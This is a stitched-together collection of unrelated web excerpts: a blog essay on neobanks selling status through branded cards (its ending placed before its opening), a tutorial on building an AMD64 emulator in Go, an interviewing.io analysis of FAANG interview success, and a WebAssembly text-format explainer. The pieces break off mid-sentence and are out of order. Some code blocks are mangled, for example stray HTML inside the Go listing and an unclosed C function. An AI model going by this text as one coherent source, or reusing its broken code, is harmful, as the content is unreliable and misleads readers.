<p>But we are slowly seeing new banking apps that are focusing on different audiences. For example, there are now a <a href="https://www.tomorrow.one/">handful of</a> <a href="https://blog.gohenry.com/uk/gohenry-news/meet-our-new-biodegradable-eco-card/">“green”</a> <a href="https://www.treecard.org/">neobanks</a> that help users signal environmental altruism. </p>



<p>Or how about <a href="https://www.razer.com/razer-card">this Razer Card</a> targeted at the gamer community?</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/12/environment.png"></p><p>The question for these companies and their investors is whether the in-group is big enough to justify building an entire bank around it. Making the unit economics of a bank work requires a certain amount of users, but as we discussed earlier, the signaling strength decreases as the size of in-group increases.</p>



<p>So how do you solve this problem?<br>By introducing multiple in-groups.</p>



<p>See, the current model looks like this:</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/neogroup01.png"></p><p>(In fact, given how undifferentiated most of the offerings and cards are, there are actually multiple neobanks within the same small in-group bubble.)</p>



<p>But what if one bank would target multiple, different in-groups?</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/neogroup02.png"></p><p>For example, what if N26 had dedicated cards for soccer fans, hip-hop enthusiasts and gamers? Instead of focusing on just one signaling audience, their total addressable market would massively increase. </p>



<p>The way they would target these audiences is via brand collaborations. N26 does not have the necessary reputation in any of the above-mentioned areas to build credible signaling messages. It would not be able to build attractive in-groups on its own – but other brands could lend N26 their social capital. </p>



<p>Apple has long worked with <a href="https://www.apple.com/lae/product-red/">RED</a>, IKEA recently <a href="https://www.highsnobiety.com/p/virgil-abloh-ikea-collaboration-best-look/">teamed up with Virgil Abloh</a>, and <a href="https://www.headspace.com/partners/nike-partnerships">Nike partners with Headspace</a>. Why wouldn’t this concept work for neobanks?</p>



<p>What would <strong>N26 x Manchester United</strong> look like? <br>Or <strong>Chime x Supreme</strong>? <br>Or <strong>Revolut x 100 Thieves</strong>?</p>



<p>Because of a bigger target audience overall, individual in-groups could be kept smaller. Cards could be <a href="https://thegeneralist.substack.com/p/scarcity-as-an-api">released as limited edition drops</a> transforming them into collectibles, which would justify a higher price tag per card.</p>



<p>It’s worth noting that different signaling audiences are not mutually exclusive. We don’t just subscribe to a single in-group – our <a href="http://julian.digital/2020/09/25/is-this-real-life/">identities are prismatic</a>. This means that some users might …</p></div></div>

      <div>
        <p>In this post we'll stumble toward a working emulator for a barebones C
program compiled for linux/AMD64. The approach will be slightly more
so based on observation than by following a spec; a great way
to quickly become familiar with a topic, and a bad way to guarantee
correctness.</p>
<p>The goal:</p>
<pre><code>$ cat tests/simple.c
int main() {
  return 4;
}
$ gcc tests/simple.c
$ go build -o main
$ ./main a.out &amp;&amp; echo $?
4
</code></pre>
<p>This may look ridiculously simple but when you don't know how to deal
with a binary or how instructions are encoded, it will take a few
hours to write an emulator that can generally handle this program!</p>
<p>Code for this project is <a href="https://github.com/eatonphil/go-amd64-emulator">available on Github</a>.</p>
<h3 id="background">Background</h3><p>AMD64, x86_64 or x64 are different names for AMD's widely adopted
64-bit extension to Intel's x86 instruction set (i.e. the encoding and
semantics of x86 binaries). AMD64 is a superset of x86 (introducing
64-bit registers and operations) and thus backwards compatible with
x86 programs.</p>
<p>
  A year and a half ago I first got into emulation with
  an <a href="https://notes.eatonphil.com/emulator-basics-a-stack-and-register-machine.html">AMD64
  emulator in JavaScript</a>. The JavaScript emulator interpreted the
  textual representation of AMD64 programs (e.g. <code>MOV RBP,
  RSP</code>, Intel's assembly syntax). A C program had to be compiled
  with <code>-S</code> to produce an assembly file that the JavaScript
  emulator could read (i.e. <code>gcc -S tests/simple.c</code>) This
  was a great way to get started with emulation by ignoring the
  complexity of encoded instructions and executable formats.
</p><p>If we dig into the binary file produced by gcc on Linux we learn that
it is an <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format">ELF
file</a>.</p>
<pre><code>$ gcc test/simple.c
$ file a.out
a.out: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d0b5c742b9fbcbcca4dfa9438a8437a8478a51bb, for GNU/Linux 3.2.0, not stripped
</code></pre>
<p>ELF is responsible for surrounding the actual binary-encoded program
instructions with metadata on exported and imported C identifiers and
program entrypoint. But for simple programs like this initial
emulator, we can ignore export/imports. We'll only use the ELF
metadata to find out where the instructions for our <code>main</code>
function start.</p>
<h3 id="where-is-main?">Where is main?</h3><p>If we use an ELF reader+disassembler on the binary generated by gcc
and search for <code>main</code> we can find its address.</p>
<pre><code>$ objdump -d a.out | grep -A10 '&lt;main&gt;'
0000000000401106 &lt;main&gt;:
  401106:       55                      push   %rbp
  401107:       48 89 e5                mov    %rsp,%rbp
  40110a:       b8 fe 00 00 00          mov    $0xfe,%eax
  40110f:       5d                      pop    %rbp
  401110:       c3                      retq
  401111:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  401118:       00 00 00
  40111b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401120 &lt;__libc_csu_init&gt;:
</code></pre>
<p>This means that the function, <code>main</code>, starts at
address <code>0x401106</code> in memory. Furthermore, this implies
that the binary must be loaded into CPU memory such that the CPU can
jump here to execute our program.</p>
<p>In truth, <code>main</code> is not this program's entrypoint. If we
run <code>objdump -x a.out</code> we can see that the ELF entrypoint
is <code>0x401020</code>.</p>
<pre><code>$ objdump -x a.out
a.out:     file format elf64-x86-64
a.out
architecture: i386:x86-64, flags 0x00000112:
EXEC_P, HAS_SYMS, D_PAGED
start address 0x0000000000401020

Program Header:
    PHDR off    0x0000000000000040 vaddr 0x0000000000400040 paddr 0x0000000000400040 align 2**3
             filesz 0x00000000000002d8 memsz 0x00000000000002d8 flags r--
</code></pre>
<p>This is because the actual entrypoint gcc sets up is a function called
<code>_start</code>. The libc prelude beginning
with <code>_start</code> is responsible for initializing the libc
runtime, calling our <code>main</code> function and executing the exit
syscall with the return value of <code>main</code>.</p>
<pre><code>objdump -d a.out | grep -A10 '&lt;_start&gt;'
0000000000401020 &lt;_start&gt;:
  401020:       f3 0f 1e fa             endbr64
  401024:       31 ed                   xor    %ebp,%ebp
  401026:       49 89 d1                mov    %rdx,%r9
  401029:       5e                      pop    %rsi
  40102a:       48 89 e2                mov    %rsp,%rdx
  40102d:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
  401031:       50                      push   %rax
  401032:       54                      push   %rsp
  401033:       49 c7 c0 90 11 40 00    mov    $0x401190,%r8
  40103a:       48 c7 c1 20 11 40 00    mov    $0x401120,%rcx
</code></pre>
<p>But because all this libc initialization is relatively complicated
we're just going to skip the actual ELF entrypoint for now. Our
emulator will locate <code>main</code>, load the binary into memory,
jump to the start of <code>main</code>, and set the exit code of the
emulator to the result of main.</p>
<p>
  As you can see, this ELF binary has its own hard-coded view of where
  it will be in memory. What if our CPU were to run multiple process
  at once? We might give each process its own virtual memory space
  and map back to a real memory space so each process (and by
  extension, compilers) doesn't have to think about how they fit into
  memory relative to other processes.
</p><p>The last question to figure out is where to load the ELF binary into
emulator memory so that addresses in memory are where the program
expects.</p>
<p>As it turns out, there is a piece of metadata called section
headers that contain an address and a offset from the start of the ELF
file. By subtracting this we can get the location the file expects to
be in memory.</p>
<pre><code>$ objdump -x a.out
a.out:     file format elf64-x86-64
a.out
architecture: i386:x86-64, flags 0x00000112:
EXEC_P, HAS_SYMS, D_PAGED
start address 0x0000000000401020

Program Header:
    PHDR off    0x0000000000000040 vaddr 0x0000000000400040 paddr 0x0000000000400040 align 2**3
             filesz 0x00000000000002d8 memsz 0x00000000000002d8 flags r--
</code></pre>
<p>That is: <code>0x400040 (vaddr) - 0x40 (off) = 0x400000</code>.
Judging from a Google search this seems to be a pretty common address
where ELF binaries are loaded into memory.</p>
<h3 id="elf-and-go">ELF and Go</h3><p>Binary file formats tend to be a pain to work with because, to enable
greater compression, everything ends up being a pointer to something
else. So you end up jumping all around the file just to stitch
information back together.</p>
<p>So the one third-party-ish library we'll use is Go's builtin
<code>debug/elf</code> package. With this library we can load an ELF
binary and iterate over symbols and sections to discover the location
of <code>main</code> and the start address for the binary in memory.</p>
<p>Editing in <code>main.go</code>:</p>
<pre><code>package main

<p>We can test on a basic compiled C program:</p>

int main() {
  return 4;

$ gcc tests/simple.c
$ go build -o main
$ ./main a.out
Start: 0x400000
Entry: 0x401106
</code></pre>
<p>And verify against <code>objdump</code>:</p>
<pre><code>$ objdump -d a.out | grep -A10 '&lt;main&gt;'
0000000000401106 &lt;main&gt;:
  401106:       55                      push   %rbp'&gt;'
</code></pre>
<p>And that's it for dealing with ELF. Now we can sketch out a virtual
CPU and how we deal with interpreting instructions starting at this
address.</p>
<h3 id="the-cpu">The CPU</h3><p>AMD64 counts on being able to store values in registers and memory,
sometimes through direct addressing and sometimes indirectly using
stack operations (push and pop). And userland processes count on being
loaded into CPU memory so the CPU can jump to the process entrypoint
and process.</p>
<pre><code>type cpu struct {
    proc    *process
    mem     []byte
    regfile *registerFile
    tick    chan bool
}

func newCPU(memory uint64) cpu {
    return cpu{
        mem:     make([]byte, memory),
        regfile: &amp;registerFile{},
        tick:    make(chan bool, 1),
    }
}
</code></pre>
<p>The <code>tick</code> channel is so that later on we can wrap the
emulator in a terminal debugger. But by default we'll just set up a
goroutine to tick forever.</p>
<pre><code>func repl(c *cpu) {
  // TODO
}

func main() {
    if len(os.Args) &lt; 2 {
        log.Fatal("Binary not provided")
    }

    proc, err := readELF(os.Args[1], "main")
    if err != nil {
        panic(err)
    }

    debug := false
    for _, arg := range os.Args[1:] {
        switch arg {
        case "--debug":
            fallthrough
        case "-d":
            debug = true
        }
    }

    // 10 MB
    cpu := newCPU(0x400000 * 10)

    go cpu.run(proc)
    if debug {
        repl(&amp;cpu)
    } else {
        for {
            cpu.tick &lt;- true
        }
    }
}
</code></pre>
<h3 id="registers">Registers</h3><p>To emulate a simple program like our <code>tests/simple.c</code>,
we'll only need to support a few common registers. The order is
important so that we can use the Go identifiers when we want to refer
to the <a href="https://wiki.osdev.org/X86-64_Instruction_Encoding#Registers">encoded integer value of the

<p>Recently, someone asked us how you know you’re ready to succeed in a Facebook/Amazon/Apple/Netflix/Google (FAANG) interview.</p>



<figure><img loading="lazy" width="359" height="180" src="https://blog.interviewing.io/wp-content/uploads/2020/11/2020-11-30-faang-question-c.png" alt="" srcset="https://blog.interviewing.io/wp-content/uploads/2020/11/2020-11-30-faang-question-c.png 359w, https://blog.interviewing.io/wp-content/uploads/2020/11/2020-11-30-faang-question-c-300x150.png 300w, https://blog.interviewing.io/wp-content/uploads/2020/11/2020-11-30-faang-question-c-200x100.png 200w, https://blog.interviewing.io/wp-content/uploads/2020/11/2020-11-30-faang-question-c-50x25.png 50w" sizes="(max-width: 359px) 100vw, 359px"></figure>



<p>It’s an interesting question, and one I’m sure many of you job seekers out there are wondering.</p>



<p>Internally, we have our own beliefs, but we wanted to see if we could answer this question more objectively. So we set off on a journey to acquire data to try answering it.</p>



<span>Methodology</span>



<p>interviewing.io helps prospective job candidates practice mock interviews with actual interviewers from the major tech companies like the aforementioned FAANG companies, as well as others like Dropbox, Uber, LinkedIn, and Slack. </p>



<p>After each mock interview, candidates are measured on a 1-4 scale against three criteria (technical ability, problem solving, and communication) and are also given an overall hire/no hire rating.</p>



<figure><img loading="lazy" width="699" height="618" src="https://blog.interviewing.io/wp-content/uploads/2017/11/Screenshot-2017-11-29-09.13.30.png" alt="" srcset="https://blog.interviewing.io/wp-content/uploads/2017/11/Screenshot-2017-11-29-09.13.30.png 699w, https://blog.interviewing.io/wp-content/uploads/2017/11/Screenshot-2017-11-29-09.13.30-200x177.png 200w, https://blog.interviewing.io/wp-content/uploads/2017/11/Screenshot-2017-11-29-09.13.30-300x265.png 300w, https://blog.interviewing.io/wp-content/uploads/2017/11/Screenshot-2017-11-29-09.13.30-680x601.png 680w, https://blog.interviewing.io/wp-content/uploads/2017/11/Screenshot-2017-11-29-09.13.30-400x354.png 400w, https://blog.interviewing.io/wp-content/uploads/2017/11/Screenshot-2017-11-29-09.13.30-50x44.png 50w" sizes="(max-width: 699px) 100vw, 699px"><figcaption>Feedback form filled out by interviewers after an interviewing.io mock interview</figcaption></figure>



<p>In our analysis, we used these scores to estimate a candidate’s overall skill level, which we would expect to be positively associated with “readiness”.</p>



<p>Additionally, we needed to know whether a job candidate’s skill level and preparation ultimately resulted in the candidate getting the job. Since most real world interviews happen outside of interviewing.io, we surveyed our users to learn how far through the hiring funnel they progressed at three popular tech companies: Google, Facebook, and Amazon. For each of these companies, at least 150 respondents reported participating in the company’s hiring processes. These were the hiring stages we asked for in the survey:</p>



<ul><li>Applied</li><li>Recruiter call</li><li>Technical phone interview</li><li>Take-home assignment</li><li>Onsite</li><li>Offer</li><li>Hire</li></ul>



<p>We also needed to consider variables that could affect a person’s chance of progressing through the hiring funnel, but weren’t necessarily related to “readiness”. In addition to the mock interview feedback ratings mentioned above, we grabbed the following data about users that we collect at interviewing.io:</p>



<ul><li>How many mock interviews completed on interviewing.io</li><li>Self-reported career experience level (e.g. junior, intermediate, experienced)</li></ul>



<p>Finally, we asked survey respondents to share data that our platform doesn’t collect but could be associated with a higher chance of landing a job. Here were those other attributes:</p>



<ul><li>Gender</li><li>Possessed a computer science degree?</li><li>How many real tech interviews they’ve attended as interviewee (excludes mock interviews)</li><li>How the person learned to code</li><li>How long ago did they last go through a job search</li></ul>







<span>Relationship of respondents’ technical scores to interview success</span>



<p>Intuitively, you would think that better technical ability would be associated with a higher chance of succeeding at interviews. To see if this intuition holds true, let’s look at the frequency of people passing a phone interview, bucketed by a person’s average technical rating on interviewing.io, and see if a positive correlation exists.</p>



<p>Based on 158 respondents who reported to have progressed at least as far as Google’s phone interview phase, we observed a positive-looking relationship, but maybe not as obvious a relationship as one might expect.</p>



<figure><img src="https://lh3.googleusercontent.com/0Yx8qkjGSgv0uyzS1qHTKXEiqFYHhl2mjkqqrdgFdGltXAKMuIHQ1yVVEQNg6Lof8fT9eETUhG2s71ixmGfwtBCfLr9hn8T6mUsBfKWZfnLCoYpMZoYC6ZIDFAT7m_Zot4_cA6Y" alt=""></figure>



<p>Looking at respondents who went through the Facebook and Amazon hiring processes, the relationship seemed even less obvious:</p>



<figure><img src="https://lh5.googleusercontent.com/CHx1zzmQtTUY9TfE0Y5gZpwK_atcjgFGNDkyb_lWkFycAAIkkNQP-rGh4bgOiSzurtStX8HWrH61BBuWWkJh53R06oCgnM2VV5PeaRpLGZNXDl23WkZHbQTPsInHZ1cu8-sz1sQ" alt=""></figure>



<figure><img src="https://lh4.googleusercontent.com/zIUpkgse1iOZmmSCUsxNZgWeAC124-d0sZlmFkl6Mkj4XiAOd_vFU_1GxA-34e-Td8VDD8MRpY0PE6bxb9bZvBl2pi74NXk4yNGzO7Mzg4jkm_75hMNheduI5G-KIwYWbGutGVk" alt=""></figure>



<p>While it would be simple to conclude there exists no relationship between technical ability and passing a phone interview, it seems more likely that we were experiencing selection bias. After all, 60-80% of people progressing past Google/Amazon/Facebook phone screens seems a bit high relative to what one might expect.</p>



<p>Compared to the population of all people on interviewing.io, survey respondents with high average technical scores between 3 and 4 were over-represented relative to those who scored between 1.5 and 2.75<sup><a id="footnote1" href="#footnote1-details">[1]</a></sup>. Maybe non-respondents with lower scores and who failed Google/Facebook/Amazon phone interviews happened to be less likely to respond to our survey.</p>



<p>So that’s pretty limiting. But let’s keep in mind that all models are wrong, yet some are useful, so perhaps it’s still possible to learn other stuff from the data. If the survey respondents’ technical abilities weren’t obviously associated with interview success, what about other factors?</p>



<span>More experience with real technical interviews is associated with future interview success</span>



<p>When digging further, the factor that stood out most was how many real technical interviews the candidate had done in the past. Across all three companies, people who had completed 5 or more real technical interviews tended to have higher rates of passing a phone interview than those who had less real interview experience.</p>



<figure><img src="https://lh3.googleusercontent.com/y2MlAXnOdEb_5evno08aQnxD9i7mHv2-e2jjwg0PjdSE4TC-EuAgcy17b6_gPYjxHgz0aimKPq-TNcC6gdY6mgO_BCTC9dHS7O5BvQCrFlE-WhAVgeQumMaJnEV15xNNq9yCsY0" alt=""></figure>



<figure><img src="https://lh5.googleusercontent.com/dypDixrmeIx3LUZqjB-GuD0L91iSxOJgtEdp2ENhMZ53_UiHRKSZZ9d_vEX4KQC_4JEu7dxqT_gRMDM_rP5hcRj-a08GMaEqvXhWNGCthd7Jvf9159kNQIEt7vLFaWXsRqw-9ww" alt=""></figure>



<figure><img src="https://lh4.googleusercontent.com/95fYSFE27TziZN1JrBDinxQMPiwt8Ny58_IuHvL52e00Z7kRF-lHmZSXdpr1ng0nMCQ3Zk-qZNFP8bu9CDqjTBw3IADshelLhdqPIiy2ZvpJEZC-o1kkLHKfzH9BEiQtOkDoyEk" alt=""></figure>



<p>It’s possible this large effect could have been confounded by other factors, so I iterated on the model to account for these factors, to see whether the effect of prior interview experience on interview success would continue to shine through.</p>



<p>Here were the factors considered:</p>



<ul><li>Average technical rating</li><li>Average problem solving rating</li><li>Average communication rating</li><li>Number of mock interviews completed on interviewing.io</li><li>Experience level</li><li>Gender</li><li>Did the person have a computer science degree?</li></ul>



<p>For 171 respondents who went through the Amazon hiring process, a statistically significant association continued to exist between prior technical interview experience and succeeding in a phone interview. Below were the predicted probabilities of passing a phone interview for a typical respondent in this survey (males with a computer science degree and 4+ years of experience, with average technical, communication, and problem solving ability), conditional on their prior technical interview experience.</p>



<figure><table><tbody><tr><td><strong>Prior Experience</strong></td><td><strong>Predicted Probability of Passing Amazon Phone Screen</strong></td></tr><tr><td>1-4 technical interviews</td><td>65%</td></tr><tr><td>5+ technical interviews</td><td>81%</td></tr></tbody></table></figure>



<p>For Facebook we observed a similar effect:</p>



<figure><table><tbody><tr><td><strong>Prior Experience</strong></td><td><strong>Predicted Probability of Passing Facebook Phone Screen</strong></td></tr><tr><td>1-4 technical interviews</td><td>40%</td></tr><tr><td>5+ technical interviews</td><td>71%</td></tr></tbody></table></figure>



<p>Finally, for Google applicants we observed that the number of interviewing.io mock interviews completed had the clearest association with interview success, not prior technical interview experience. While mock interviews aren’t exactly the same as real-world technical interviews, they are conducted by the same kinds of people asking similar questions and using similar assessment criteria. Because of this, it seems possible that the effects of mock interviews on interview success could be similar to the effect of real technical interview experience.</p>



<p>Below was the estimated chance of passing the Google phone interview for the typical survey respondent, conditional on the number of interviewing.io practice interviews attended.</p>



<figure><table><tbody><tr><td><strong>Mock interviews on interviewing.io</strong></td><td><strong>Predicted Probability of Passing Google Phone Screen</strong></td></tr><tr><td>2</td><td>69%</td></tr><tr><td>3</td><td>76%</td></tr></tbody></table></figure>



<p>Looking at the other variables we included in the model, we observed no other statistically significant relationships with success in phone interviews. It’s possible those relationships actually exist, but based on this sample, we did not observe enough evidence to reject the null hypothesis that no relationship exists.</p>



<p>So even after accounting for other factors, more technical interview experience was still associated with greater success in phone interviews.</p>



<p>We also wondered whether similar effects might exist when you get further down the hiring funnel. For example, could prior technical interview experience also improve your chances of receiving an offer after an onsite? We performed a similar analysis to predict the chance of receiving an offer conditional upon attending an onsite interview, but we found no noticeable relationships between the predictors listed above and the probability of receiving an offer. Sample sizes are naturally smaller when looking this far down the funnel, and perhaps the differences between candidates are smaller, which could be harder to detect.</p>



<p>Based on an analysis of this particular group of people, it seems we have a pretty clear answer to the original question of “What metric should be used to know you’re prepared to succeed in a FAANG interview?” </p>



<p>The answer is to <strong>experience five or more real technical interviews</strong>. Simple, right?</p>



<span>Why more experience with technical interviews helps you succeed in future technical interviews</span>



<p>I don’t know about you, but I find that answer unsatisfying. That conclusion seems <em>really</em> questionable and self-serving, especially when the recommendation comes from a company that offers mock technical interviews as a product.</p>



<p>I don’t blame you, and quite frankly, this result wasn’t what we expected either. The metric of technical interviewing experience is probably just a proxy for some other phenomenon that does correlate with interview success in some explainable way. After all, it’s unlikely that just showing up to five interviews will magically bestow upon you new talents.</p>



<p>So what is it about having technical interview experience that might be associated with success in future technical interviews? To dig even deeper, we followed up with survey respondents who successfully received an offer with Google, Facebook, or Amazon, and asked what factors they felt contributed to their success.</p>



<p>As you’d expect, nearly all respondents said practicing technical problems was the foundation for their success. So yes, technical competency matters, and no, past interview experience doesn’t appear to be a substitute for it.</p>



<p>Beyond technical ability, respondents shared anecdotes that hint at why such a relationship might exist, as well as some possible underlying factors that could explain what technical interview experience might proxy for.</p>



<span>Direct feedback from other people helps you improve quicker</span>



<p>It’s one thing to get a question wrong in a practice environment, and it’s another thing to get a question wrong when you have an interviewer looking over your shoulder. …</p></section></div>

<a href="https://ph1lter.bitbucket.io/index.html">(home)</a> <span>2020-12-03</span>
<p>The combination of forth semantics and s-expr syntax makes the WebAsm text format (WAT/.wat) probably the most
powerful programming language extant today. Soon I expect it to obviate <em>all other languages</em>. <span>joke</span>
</p>
<p>There is a common myth floating around that webasm is just a binary format for a javascript AST (abstract syntax
tree). That is <em>really</em> selling webasm short.
</p>
<h2> forth</h2>
<p>webasm is like forth in so far as it is a stack machine. There are no registers in the webasm virtual machine.
</p>
<p>Unlike forth, webasm functions have explicit parameters, local variables and only return a single value (currently).
webasm also lacks forth's rich set of words for stack manipulation <code>[dup swap roll ...]</code>
</p>
<h2> lisp</h2>
<p>webasm's text format uses lisp/s-expr syntax. The language syntax also has many lisp style influences. Impressive!
<span>Finally, someone in a position of power has realized that we should be using s-expr's for everything and discarding xml and json.</span>
</p>
<h2> static typing</h2>
<p>All webasm globals, locals, parameters and functions are strongly statically typed. Only a few simple types (integer and float) and
a reference type are allowed. <code>[types::=i32,i64,f32,f64]</code>.
</p>
<p>Note the absence of strings or even arrays. No unsigned types either, although there are some instructions which can
be marked signed/unsigned <code>[right-shift, greater-equal ...]</code>.
</p>
<h2> memory</h2>
<p>wasm memory layout is like what you find on simple 80's computer or a <em>not-too-modern</em> microcontroller. The memory starts at zero
and proceeds to a specified max value (the max value is dynamically growable, cf. C's brk()).
</p>
<p>Not even malloc() is provided.
</p>
<p>Memory pointers are just i32/i64 integer offsets in the memory array (exactly the same as <em>real</em> pointers ...).
</p>
<h2> assembler</h2>
<p>wasm instructions are very much on the assembler end of the spectrum, with <code>i32.add, f32.neg</code> and the like.
There are some slightly higher-level (more controlled) control forms like (block) and (loop). Arbitrary jumps
are not possible [security feature]. Indeed code and data are <strong>not</strong> in the same address space, and code space is
completely opaque to the wasm programmer.
</p>
<h2> overall structure</h2>
<p>The top-level form is a <code>(module ...</code>) which can contain globals and functions.
<span>There are also import, export, memory size specs and even type definitions.</span>
</p>
<pre>(module
  (func $malloc (param $len i32) (result i32)
    ;; ... body returning an i32
    ))
</pre>
<p>Canonically instructions are laid out flat but the text format also allows for a much nicer nested s-expr syntax.
</p>
<p>flat syntax (making the stack machine more obvious):
</p>
<pre>global.get $dot
local.get $len
i32.add
global.set $dot
</pre>
<p>s-expression alternative (same code)
</p>
<pre>(global.set $dot (i32.add (global.get $dot) (local.get $len)))
</pre>
<p>Parameters, locals and even functions can all be accessed by index but they can be given optional labels too.
This and the s-expr option makes it a breeze to code directly in the language itself. <span>joke</span>
</p>
<h2> runtime environment</h2>
<p>The entire wasm code is called from javascript, which has an api designed to load and import functions from a wasm file
(see below for example)
</p>
<h2> import/export</h2>
<p>webasm functions can be exported to javascript like this:
<span>note how the wasm return value is implicitly whatever is on the stack at exit; wat compilers check stack arity and type.</span>
</p>
<p><span>[full code example at the end]</span>
</p>
<pre>(func (export "addNumbers") (param $a i32) (param $b i32) (result i32)
  (i32.add (local.get $a) (local.get $b)))
</pre>
<pre>// called from javascript like this (after some incantations)
var someNumber = 17;
const sum = wasm.instance.exports.addNumbers(12, someNumber);
</pre>
<p>Javscript can also export functions into wasm-space, using a 2-level object passed into the WebAssembly incantation.
</p>
<pre>// export a console.log(i32) function
var importObject = {
  console: { log: function(num) { console.log(num + " 0x" + (num&gt;&gt;&gt;0).toString(16)); } },
  };
WebAssembly.instantiateStreaming(fetch("malloc.wasm"), importObject)
&nbsp; .then(function(wasm){
      .... access wasm functions in here
      });
</pre>
<p>The javascript exports must be explicitly imported by the wasm module and given a local function signature (and name).
<span>unlike the js counterpart, the wasm function is strongly, statically typed, taking a single i32 parameter, only</span>
</p>
<pre>(import "console" "log" (func $js_log (param $i i32)))
...
(call $js_log (i32.const 15)) ;; example of calling out to javascript
</pre>
<h2> externref - the part of the spec we wish we had</h2>
<p>It would be nice to have another wasm type, an opaque, read-only, javascript reference object which we could receive from javascript,
store and later pass back to javascript in our callouts/callbacks.
</p>
<p>You will miss this feature almost as soon as you write your first substantial <code>wat</code> program.
</p>
<p>Alas the <code>externref</code> spec is not part of the original webasm spec and is a newer addition. I am not sure how widely adopted it is.
</p>
<h2> a more substantial example</h2>
<p>(the full html/wat code is linked below, also as a live example)
</p>
<p>The WAT source code of for the (cheap) malloc() example function and another (even cheaper) dump_range() function which calls back
to javascript to write bytes into the debug console.
</p>
<pre>(module
  (memory (import "js" "mem") 10)
  (import "console" "log" (func $js_log (param $i i32)))
  (global $memend i32  (i32.const 4096))
  (global $sbrk (mut i32)  (i32.const 0))
  ;; ----- allocate some memory in wasm-space
  (func (export "malloc") (param $len i32) (result i32)
    (local $newbrk i32)
    (local $mem i32)
    (local.set $newbrk (i32.add (global.get $sbrk) (local.get $len)))
    (if (i32.ge_u (local.get $newbrk) (global.get $memend))
      (return (i32.const 0)))
    (local.set $mem (global.get $sbrk))
    (global.set $sbrk (local.get $newbrk))
    (local.get $mem))
  ;; ----- write bytes in wasm-space memory using js callback
  (func (export "dump_range") (param $start i32) (param $len i32)
    (local $i i32)
    (local $end i32)
    (local.set $end (i32.add (local.get $start) (local.get $len)))
    (local.set $i (local.get $start))
    (block $break2 (loop $head1
      (br_if $break2 (i32.eq (local.get $i)  (local.get $end)))
      (call $js_log (i32.load8_u (local.get $i)))
      (local.set $i (i32.add  (i32.const 1) (local.get $i)))
      (br $head1))))

<h3>How Neobanks Should Monetize Status Signaling</h3>



<p><span>01</span> Intro</p>



<p>If you’ve been following this blog for a while, you probably know by now that one of my favorite topics to think and write about is “status signaling”.</p>



<p>Signaling explains most of our everyday actions: what clothes we wear, which universities we pick and which religion we subscribe to. Everything has a hidden signaling component with which we communicate our desired tribal affiliation.</p>



<p>In <a href="http://julian.digital/2020/03/28/signaling-as-a-service/">Signaling-as-a-Service</a>, I described the implications signaling has on the monetization of software businesses. For many traditional industries, monetizing the display of status is not a new concept. A Rolex watch, for example, is not better at telling the time than a cheap Casio watch. But a Rolex reveals something about its owners’ wealth and, thus, their status in society. It’s that status message that explains the difference in price.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/equaltime.png"></p><p>Similarly, driving a Prius says something about your views on climate change. A <em>Make America Great Again</em> cap reveals something about your political affiliations. And Nike athletic wear signals a healthy, pro-active lifestyle.</p>



<p>Software is at a crucial disadvantage compared to these physical products because of its intangibility. A fitness app also signals a healthy, pro-active lifestyle, but no one can see it because it only lives on your phone. Everyone can see your Nike gear whenever you wear it in public. Software can’t offer the same benefit. It doesn’t have a signaling distribution channel.</p>



<p>This is why there is no software equivalent of a Rolex watch or a Louis Vuitton handbag. People aren’t willing to spend money on things other people can’t see they spent money on.</p>



<p>But it doesn’t have to be that way. As software is eating the world, the lines between physical and digital products are becoming increasingly blurry. As I have pointed out in my original essay, one way for software companies to solve the signaling distribution problem is to add a physical element to their software product.</p>



<p>In this post I want to explore this idea a little bit further. Specifically, we’ll look at neobanks – and their opportunity to monetize credit card signaling.</p>



<p><span>02</span> Neobanks</p>



<p>In the last couple of years we have witnessed the birth and rise of a new startup vertical: neobanks.</p>



<p>Neobanks differ from traditional banks in two ways:</p>



<p>1) Rather than relying on a physical branch network, the entire banking experience is managed via an app</p>



<p>2) Instead of the <a href="https://www.youtube.com/watch?v=C-q4bEULG64">“how do you do, fellow kids”</a>-cringiness that ad campaigns of traditional banks usually invoke when they try to appeal to a younger audience, neobanks are actually perceived as cool. In fact, many of them feel more like lifestyle brands than banks or tech companies.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/12/1_26qGBSGmB3yaPD7nZJrFIg.gif">



<img src="https://julian.digital/wp-content/uploads/2020/12/lifestylebrand-1.png"></p><p>Interestingly though, neobanks still use one very traditional banking element: physical cards.</p>



<p>At first glance, this might seem counterintuitive. If you are building a mobile-first bank, why not offer virtual cards and let users pay with their phone? Why go through the hassle of producing and shipping physical cards?</p>



<p>The answer is – you guessed it – signaling.</p>



<p>Think about it: Paying for things (offline) is a social activity. It’s an interaction between at least you and a cashier or waiter. But ideally, in a dinner scenario for example, you are surrounded by other people you want to impress: a date, a group of friends, or work colleagues.</p>



<p>This makes the moment you take out your card to pay the bill a great opportunity to make a statement and build social capital.</p>



<p>If you look at neobanks out there today, it’s pretty obvious that signaling is in fact one of the main benefits they offer – and almost the only thing they monetize <span>(apart from interchange, of course)</span>:</p>



<ul><li>The premium subscriptions neobanks offer usually don’t win on features but solely on nicer looking cards. The <a href="https://n26.com/metal">N26</a> or <a href="https://revolut.com/metal">Revolut</a> Metal plans, for example, don’t offer any additional features that <em>really</em> justify the ~€15 / month price tag. They do include a nice looking metal card though – that’s what people pay for.</li><li>Relatedly, it seems like most of the innovation in the industry is happening in card design. The actual banking products are more or less interchangeable, what differs is whether the card comes in <a href="https://www.apple.com/apple-card/">titanium</a>, <a href="https://www.treecard.org/">wood</a>, or <a href="https://twitter.com/cashapp/status/1290694734529400832">glow-in-the-dark yellow</a>.</li><li>You may have noticed that the credit card number has moved from the front to the back of the card. This makes it easier for users to share photos of their cards on social media as an additional signaling distribution channel.</li></ul>



<p><img src="https://julian.digital/wp-content/uploads/2020/11/nocardnumber-1.png"></p><p>Neobanks are popping up like mushrooms after the rain at the moment and it’s unlikely that this trend will end any time soon. Thanks to banking-as-a-service providers, we’ll likely see a lot of non-banking-companies add banking functionalities and cards to their product offering.</p>



